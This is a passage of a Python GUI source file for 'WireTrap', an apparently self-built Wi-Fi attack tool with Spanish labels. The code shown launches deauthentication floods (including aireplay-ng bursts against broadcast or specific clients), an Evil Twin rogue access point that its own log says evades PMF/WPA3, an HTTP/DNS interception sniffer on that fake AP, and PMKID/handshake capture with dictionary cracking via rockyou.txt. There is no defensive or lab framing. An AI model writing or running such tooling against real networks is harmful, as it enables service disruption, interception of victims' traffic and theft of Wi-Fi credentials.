        self.btn_attack.setEnabled(True)

    # ── Botones Deauth ────────────────────────────────────────

    def _on_scan_clicked(self):
        iface = self.iface_combo.currentText()
        if not iface:
            QMessageBox.warning(self, "Error", "Selecciona una interfaz.")
            return

        self.ap_table.setRowCount(0)
        self.client_table.setRowCount(0)
        self.selected_ap     = None
        self.selected_client = None
        self.attack_plan     = None

        self.scanner = Scanner(iface)
        self.scanner.on_ap_found     = lambda ap: self.bridge.ap_found.emit(ap)
        self.scanner.on_client_found = lambda c: self.bridge.client_found.emit(c)

        self.scanner.start()
        self._refresh_timer.start()
        self.status_label.setText("● ESCANEANDO")
        self.status_label.setStyleSheet("color: #00ff88; font-weight: bold;")
        self.log(f"Escaneo iniciado en {iface}...")

    def _on_attack_clicked(self):
        if not self.selected_ap:
            QMessageBox.warning(self, "Error", "Selecciona un AP primero.")
            return

        if not self.attack_plan:
            return

        iface_mon = self.iface_combo.currentText()
        iface_ap  = self.iface2_combo.currentText()
        iface_out = self.out_combo.currentText()

        if self.scanner:
            self.scanner.stop()

        if self.selected_ap.channel:
            import subprocess
            subprocess.run(
                ["iw", "dev", iface_mon, "set", "channel",
                 str(self.selected_ap.channel)],
                capture_output=True
            )
            self.log(f"Canal fijado en interfaz monitora: {self.selected_ap.channel}")

        self.log(f"Iniciando ataque: {self.attack_plan.technique}")
        self.log(f"Razón: {self.attack_plan.reason}")

        client_mac = (self.selected_client.mac
                      if self.selected_client
                      else "ff:ff:ff:ff:ff:ff")

        self.deauther = Deauther(iface_mon)
        self.deauther.on_packet_sent = (
            lambda c: self.bridge.log_message.emit(f"Deauth enviados: {c} paquetes")
        )

        if self.chk_eviltwin.isChecked():
            self.evil_twin = EvilTwin(iface_ap)
            self.evil_twin.on_started = (
                lambda s, ch: self.bridge.log_message.emit(
                    f"Evil Twin activo: {s} (canal {ch})"
                )
            )
            self.evil_twin.on_client_join = (
                lambda info: self.bridge.client_joined.emit(info)
            )
            self.evil_twin.on_stopped = (
                lambda: self.bridge.attack_stopped.emit()
            )
            self.evil_twin.on_error = (
                lambda msg: self.bridge.log_message.emit(
                    f"[!] Evil Twin ERROR: {msg}"
                )
            )
            wpa_pass = getattr(self, "wpa_passphrase", "")
            if wpa_pass:
                et_security = "WPA2"
                self.log(f"Evil Twin: WPA2 con contraseña proporcionada")
            else:
                et_security = "OPEN"
                self.log("Evil Twin: red OPEN (sin contraseña)")

            self.evil_twin.start(
                ssid=self.selected_ap.ssid,
                channel=self.selected_ap.channel or 6,
                security=et_security,
                out_interface=iface_out,
                wpa_passphrase=wpa_pass or "wiretrap123",
                target_bssid=self.selected_ap.bssid
            )

            if self.evil_twin.running:
                self.deauther.on_et_window = (
                    lambda: self.bridge.log_message.emit(
                        "[ET] Ventana libre — esperando asociación al AP falso..."
                    )
                )
                self.deauther.start_et_mode(client_mac, self.selected_ap.bssid)
                self.log(f"Usando MAC natural de la antena (Natural Roaming Mode "
                         f"para evadir protecciones PMF/WPA3)")

                actual_ap_iface = getattr(self.evil_twin, "ap_iface", iface_ap)

                import time
                time.sleep(1.0)

                self.sniffer = WireTrapSniffer(actual_ap_iface)
                self.sniffer.on_data = lambda d: self.bridge.data_captured.emit(d)
                self.sniffer.start()
                self.log(f"Módulo de Interceptación HTTP/DNS activo en {actual_ap_iface}")
            else:
                self.deauther.start(client_mac, self.selected_ap.bssid)
                self.log("[!] Abortando inicio del sniffer porque falló AP falso.")

            self.et_table.setRowCount(0)
            self.et_group.setStyleSheet(
                "QGroupBox { border: 1px solid #ffaa00; color: #ffaa00; "
                "border-radius: 4px; margin-top: 8px; padding-top: 10px; }"
            )
        else:
            self.deauther.start(client_mac, self.selected_ap.bssid)
            self.log("Modo Deauth Puro (Evil Twin deshabilitado)")

        self.attacking = True
        self._update_attack_info()
        self.status_label.setText("● ATACANDO")
        self.status_label.setStyleSheet("color: #e94560; font-weight: bold;")
        self.btn_stop.setEnabled(True)
        self.btn_attack.setEnabled(False)

    # ── MÓDULO WPA2 CRYPTO ──────────────────────────────────────

    def _setup_wpa2_ui(self, parent_widget):
        layout = QVBoxLayout(parent_widget)
        layout.setContentsMargins(10, 10, 10, 10)

        header = QHBoxLayout()
        self.btn_back_wpa2 = QPushButton("⬅ Volver al Menú")
        self.btn_back_wpa2.setFixedWidth(150)
        self.btn_back_wpa2.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_back_wpa2.clicked.connect(lambda: self.stack.setCurrentIndex(0))
        header.addWidget(self.btn_back_wpa2)
        header.addSpacing(20)

        title = QLabel("🔒 WireTrap: Ataques WPA2 (PMKID & Handshakes)")
        title.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        header.addWidget(title)
        header.addStretch()

        self.wpa2_dict_label = QLabel("Diccionario:")
        self.wpa2_dict_label.setFont(QFont("Monospace", 10))
        self.wpa2_dict_input = QLineEdit("/usr/share/wordlists/rockyou.txt")
        self.wpa2_dict_input.setMinimumWidth(250)
        self.wpa2_dict_input.setStyleSheet("background-color: #222; color: #fff; border: 1px solid #555; padding: 2px;")

        self.wpa2_iface_label = QLabel("Interfaz Monitor (Alfa):")
        self.wpa2_iface_label.setFont(QFont("Monospace", 10))
        self.wpa2_iface_combo = QComboBox()
        self.wpa2_iface_combo.setMinimumWidth(150)

        self.btn_wpa2_scan = QPushButton("▶ ESCANEAR REDES")
        self.btn_wpa2_scan.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.btn_wpa2_scan.setStyleSheet("background-color: #00aa44; color: black; padding: 4px 10px;")
        self.btn_wpa2_scan.clicked.connect(self._on_wpa2_scan_clicked)

        self.wpa2_status = QLabel("● IDLE")
        self.wpa2_status.setFont(QFont("Monospace", 10, QFont.Weight.Bold))
        self.wpa2_status.setStyleSheet("color: gray; font-weight: bold;")
        self.wpa2_status.setMinimumWidth(80)

        header.addWidget(self.wpa2_dict_label)
        header.addWidget(self.wpa2_dict_input)
        header.addSpacing(20)
        header.addWidget(self.wpa2_iface_label)
        header.addWidget(self.wpa2_iface_combo)
        header.addSpacing(10)
        header.addWidget(self.btn_wpa2_scan)
        header.addSpacing(20)
        header.addWidget(self.wpa2_status)
        layout.addLayout(header)

        line = QFrame()
        line.setFrameShape(QFrame.Shape.HLine)
        line.setStyleSheet("color: #444;")
        layout.addWidget(line)

        splitter = QSplitter(Qt.Orientation.Horizontal)
        table_font = QFont("Monospace", 11)
        header_font = QFont("Monospace", 11, QFont.Weight.Bold)

        ap_group = QGroupBox("OBJETIVOS (APs)")
        ap_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        ap_layout = QVBoxLayout(ap_group)
        self.wpa2_ap_table = QTableWidget()
        self.wpa2_ap_table.setColumnCount(6)
        self.wpa2_ap_table.setHorizontalHeaderLabels(["SSID", "BSSID", "Canal", "Seguridad", "Señal", "Clientes"])
        self.wpa2_ap_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.wpa2_ap_table.horizontalHeader().setFont(header_font)
        self.wpa2_ap_table.horizontalHeader().setMinimumHeight(34)
        self.wpa2_ap_table.verticalHeader().setVisible(False)
        self.wpa2_ap_table.setFont(table_font)
        self.wpa2_ap_table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
        self.wpa2_ap_table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        self.wpa2_ap_table.setAlternatingRowColors(True)
        self.wpa2_ap_table.itemClicked.connect(self._on_wpa2_ap_selected)
        ap_layout.addWidget(self.wpa2_ap_table)
        splitter.addWidget(ap_group)

        log_group = QGroupBox("HCXDUMPTOOL LIVE LOGS")
        log_group.setFont(QFont("Monospace", 12, QFont.Weight.Bold))
        log_layout = QVBoxLayout(log_group)
        self.wpa2_log_text = QTextEdit()
        self.wpa2_log_text.setReadOnly(True)
        self.wpa2_log_text.setFont(table_font)
        self.wpa2_log_text.setStyleSheet("background: #000; color: #00ff00;")
        log_layout.addWidget(self.wpa2_log_text)

        btn_layout = QHBoxLayout()
        self.btn_wpa2_start = QPushButton("▶ CAPTURAR PMKID")
        self.btn_wpa2_start.setFont(header_font)
        self.btn_wpa2_start.setStyleSheet("background-color: #00aa44; color: black; padding: 10px;")
        self.btn_wpa2_start.clicked.connect(self._start_wpa2_attack)

        self.btn_wpa2_deauth = QPushButton("💥 FORZAR DEAUTH (HANDSHAKE)")
        self.btn_wpa2_deauth.setFont(header_font)
        self.btn_wpa2_deauth.setStyleSheet("background-color: #ffaa00; color: black; padding: 10px;")
        self.btn_wpa2_deauth.setEnabled(False)
        self.btn_wpa2_deauth.clicked.connect(self._on_wpa2_deauth_clicked)

        self.btn_wpa2_stop = QPushButton("🛑 DETENER CAZA")
        self.btn_wpa2_stop.setFont(header_font)
        self.btn_wpa2_stop.setStyleSheet("background-color: #aa0000; color: white; padding: 10px;")
        self.btn_wpa2_stop.setEnabled(False)
        self.btn_wpa2_stop.clicked.connect(self._stop_wpa2_attack)

        btn_layout.addWidget(self.btn_wpa2_start)
        btn_layout.addWidget(self.btn_wpa2_deauth)
        btn_layout.addWidget(self.btn_wpa2_stop)
        log_layout.addLayout(btn_layout)

        splitter.addWidget(log_group)
        splitter.setSizes([800, 600])
        layout.addWidget(splitter, 1)

    def _on_wpa2_scan_clicked(self):
        if self.scanner and self.scanner.scanning:
            self.scanner.stop()
            self.btn_wpa2_scan.setText("▶ ESCANEAR REDES")
            self.btn_wpa2_scan.setStyleSheet("background-color: #00aa44; color: black; padding: 4px 10px;")
            self.wpa2_status.setText("● DETENIDO")
            self.wpa2_status.setStyleSheet("color: gray; font-weight: bold;")
        else:
            iface = self.wpa2_iface_combo.currentText()
            if not iface:
                QMessageBox.warning(self, "Error", "Selecciona una interfaz Alfa Monitor.")
                return
            self.scanner = Scanner(iface)
            self.scanner.on_ap_found = lambda ap: self.bridge.ap_found.emit(ap)
            self.scanner.on_client_found = lambda c: self.bridge.client_found.emit(c)
            self.scanner.on_log = lambda m: self.bridge.log_message.emit(m)
            self.scanner.start()

            self.btn_wpa2_scan.setText("🛑 DETENER ESCANEO")
            self.btn_wpa2_scan.setStyleSheet("background-color: #aa0000; color: white; padding: 4px 10px;")
            self.wpa2_status.setText("● BUSCANDO REDES")
            self.wpa2_status.setStyleSheet("color: #00ff88; font-weight: bold;")
            self.wpa2_ap_table.setRowCount(0)
            self.selected_ap = None

    def _on_wpa2_deauth_clicked(self):
        if not self.selected_ap: return
        iface = self.wpa2_iface_combo.currentText()

        ap = self.scanner.aps.get(self.selected_ap.bssid)
        client_mac = "FF:FF:FF:FF:FF:FF"
        target_name = "la red entera (Broadcast)"

        if ap and len(ap.clients) > 0:
            client_mac = list(ap.clients)[0]
            target_name = f"al cliente {client_mac}"

        self.log_wpa2(f"\\n[💥] RÁFAGA HÍBRIDA: Expulsando a {target_name} de {self.selected_ap.bssid} para forzar handshakes...")

        def run_deauth():
            import subprocess
            try:
                subprocess.run([
                    "aireplay-ng", "-0", "15", "-a", self.selected_ap.bssid, "-c", client_mac, iface
                ], capture_output=True, timeout=10)
            except Exception:
                pass

        import threading
        threading.Thread(target=run_deauth, daemon=True).start()

    def _on_wpa2_ap_selected(self):
        row = self.wpa2_ap_table.currentRow()
        if row < 0 or not self.scanner: return
        bssid = self.wpa2_ap_table.item(row, 1).text()
        if bssid in self.scanner.aps:
            self.selected_ap = self.scanner.aps[bssid]
            self.log_wpa2(f"AP seleccionado para PMKID: {self.selected_ap.ssid} ({bssid})")

    def _start_wpa2_attack(self):
        if not self.selected_ap:
            QMessageBox.warning(self, "Error", "Selecciona una red de la tabla.")
            return

        if self.scanner:
            self.scanner.stop()

        self.log_wpa2(f"\\n[⏳] Iniciando captura silenciosa sobre la red...")

        if self.selected_ap.channel:
            import subprocess
            iface_mon = self.wpa2_iface_combo.currentText()
            subprocess.run(["iw", "dev", iface_mon, "set", "channel", str(self.selected_ap.channel)], capture_output=True)
            self.log_wpa2(f"Canal fijado en {self.selected_ap.channel}")

        self.wpa2_engine = WPA2Crypto(self.wpa2_iface_combo.currentText())
        self.wpa2_engine.wordlist = self.wpa2_dict_input.text()
        self.wpa2_engine.on_log        = lambda m: self.bridge.wpa2_log_message.emit(m)
        self.wpa2_engine.on_hash_ready = lambda f: self.bridge.wpa2_log_message.emit(f"[🔑] Hash listo: {f}")
        self.wpa2_engine.on_success    = lambda f: self.bridge.pmkid_success.emit(f)
        self.wpa2_engine.on_error      = lambda e: self.bridge.pmkid_error.emit(e)
        self.wpa2_engine.on_stopped    = self.bridge.attack_stopped.emit

        self.wpa2_engine.start_pmkid_attack(self.selected_ap.bssid)
        self.wpa2_status.setText("● ATACANDO")
        self.wpa2_status.setStyleSheet("color: #e94560; font-weight: bold;")
        self.btn_wpa2_start.setEnabled(False)
        self.btn_wpa2_stop.setEnabled(True)
        self.btn_wpa2_deauth.setEnabled(True)

    def _stop_wpa2_attack(self):
        if self.wpa2_engine:
            self.wpa2_engine.stop()
        self.wpa2_status.setText("● IDLE")
        self.wpa2_status.setStyleSheet("color: gray; font-weight: bold;")
        self.btn_wpa2_start.setEnabled(True)
        self.btn_wpa2_stop.setEnabled(False)
        self.btn_wpa2_deauth.setEnabled(False)

    def _on_pmkid_success(self, file_path):
        self.log_wpa2(f"🏆 ¡Hash procesado con éxito!")
        self.wpa2_status.setText("● CRACKEANDO")
        self.wpa2_status.setStyleSheet("color: #ffaa00; font-weight: bold;")
        self.btn_wpa2_stop.setEnabled(False)
        self.btn_wpa2_deauth.setEnabled(False)

    def _on_pmkid_error(self, error):
        self.log_wpa2(f"❌ Error crítico: {error}")
        self._stop_wpa2_attack()

    def log_wpa2(self, msg):
        import datetime
        import html
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        safe_msg = html.escape(msg)
        if "error" in msg.lower():
            self.wpa2_log_text.append(f"<span style='color: #ff3333;'>[{ts}] {safe_msg}</span>")
        elif "💥" in msg or "ráfaga" in msg.lower():
            self.wpa2_log_text.append(f"<span style='color: #ffaa00;'>[{ts}] {safe_msg}</span>")
        elif "🏆" in msg or "éxito" in msg.lower():
            self.wpa2_log_text.append(f"<span style='color: #00ffff;'>[{ts}] {safe_msg}</span>")
        else:
            self.wpa2_log_text.append(f"<span style='color: #00ff00;'>[{ts}] {safe_msg}</span>")

    def _on_stop_clicked(self):
        if self.deauther:
            self.deauther.stop()
        if self.evil_twin:
            self.evil_twin.on_stopped = None
            self.evil_twin.stop()
        if self.sniffer:
            self.sniffer.stop()
        if self.scanner:
            self.scanner.stop()
        self.bridge.attack_stopped.emit()

    def log(self, message: str):
        from datetime import datetime
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_output.append(f"[{ts}] {message}")


# ── Main ──────────────────────────────────────────────────────

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = WireTrap()
    window.show()
    sys.exit(app.exec())
